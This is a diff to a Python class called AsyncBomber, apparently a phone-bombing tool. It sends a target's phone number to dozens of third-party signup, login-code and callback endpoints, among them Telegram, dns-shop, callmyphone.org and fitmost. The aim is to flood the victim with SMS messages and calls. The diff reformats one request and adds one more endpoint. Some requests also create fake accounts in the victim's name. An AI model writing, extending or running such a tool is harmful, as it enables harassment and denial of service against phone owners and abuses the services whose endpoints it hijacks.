@@ -109,9 +109,7 @@ class AsyncBomber():
 			await self.session.post("https://my.telegram.org/auth/send_password",data=f"phone=+{country_code}{phone}",headers=self.headers)
 			await self.session.post("https://callmyphone.org/do-call",json={"phone": f"+{country_code}{phone}", "browser": "undefined"},headers=self.headers)
 			await self.session.post("https://clients.cleversite.ru/callback/run.php",json={"siteid": "62731","num": f"+{country_code}{phone}","title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call"},headers=self.headers)
-			await self.session.post("https://api.delitime.ru/api/v2/signup",json={
-"SignupForm[name]": f"+{country_code}{phone}",
-"SignupForm[device_type]": 3},headers=self.headers)
+			await self.session.post("https://api.delitime.ru/api/v2/signup",json={"SignupForm[name]": f"+{country_code}{phone}","SignupForm[device_type]": 3},headers=self.headers)
 			await self.session.post("https://vladimir.edostav.ru/site/CheckAuthLogin",json={"phone_or_email": f"+{country_code}{phone}"},headers=self.headers)
 			await self.session.post("https://e-groshi.com/online/reg",json={"first_name": "Александр","last_name": "Александр","third_name": "Александр","phone": f"+{country_code}{phone}","password": name,"password2": name},headers=self.headers)
 			await self.session.post("https://esh-derevenskoe.ru/index.php?route=checkout/checkout_ajax/sendcode&ajax=yes",json={"need_reg": "1", "phone": f"+{country_code}{phone}"},headers=self.headers)
@@ -196,3 +194,4 @@ class AsyncBomber():
 			await self.session.post('https://gdz-ru.work/api/subscriptions/subscribe/45?',params={'return_to': '/subscribe/?return_to=%2Fgdz%2Falgebra%2F8-klass%2Fmuravin', 'book_id': '23143', 'src_host': 'gdz.ltd', 'woid': '275004200', 'msisdn': f"{country_code}{phone}", 'agreement': '1'},headers=self.headers)
 			await self.session.post('https://www.dns-shop.ru/auth/auth/fast-authorization/',json={'FastAuthorizationLoginLoadForm[login]': f"{country_code}{phone}", 'FastAuthorizationLoginLoadForm[token]': ''},headers=self.headers)
 			await self.session.post('https://durex-ru-backend.prod.moscow.rbdigitalcloud.com/api/v1/users/confirmation_code/',json={'phone': f"{country_code}{phone}"},headers=self.headers)
+			await self.session.get(f'https://www.fitmost.ru/send-app-link?phone={country_code}{phone}',headers=self.headers)
